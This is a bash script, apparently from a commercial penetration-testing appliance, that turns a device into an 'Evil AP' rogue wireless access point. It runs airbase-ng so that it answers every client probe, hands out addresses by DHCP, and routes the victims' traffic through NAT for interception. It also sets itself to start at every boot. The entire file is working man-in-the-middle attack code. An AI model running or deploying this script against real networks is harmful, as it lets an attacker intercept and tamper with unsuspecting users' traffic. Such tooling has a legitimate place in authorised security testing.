#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.26.2012 

# Get user variables from script_configs
. /var/pwnplug/script_configs/evilap_config.sh

# Set variables

# Clean slate
ifconfig wlan0 down
rmmod rtl8187
modprobe rtl8187
killall airbase-ng
killall dhcpd
airmon-ng stop mon0
airmon-ng stop mon1
airmon-ng stop mon3
airmon-ng stop mon4
iptables --flush
iptables --table nat --flush
sleep 2

# Start Evil AP
/usr/local/sbin/airmon-ng start wlan0
modprobe tun
/usr/local/sbin/airbase-ng -P -C 30 -c 3 -e "$ssid" -v mon0 > /var/log/evilap.log 2>&1 &
sleep 2
ifconfig at0 up 192.168.7.1 netmask 255.255.255.0
sleep 2
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcp-server/dhcpd.pid at0
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Enable Evil AP at next boot
update-rc.d evilap defaults
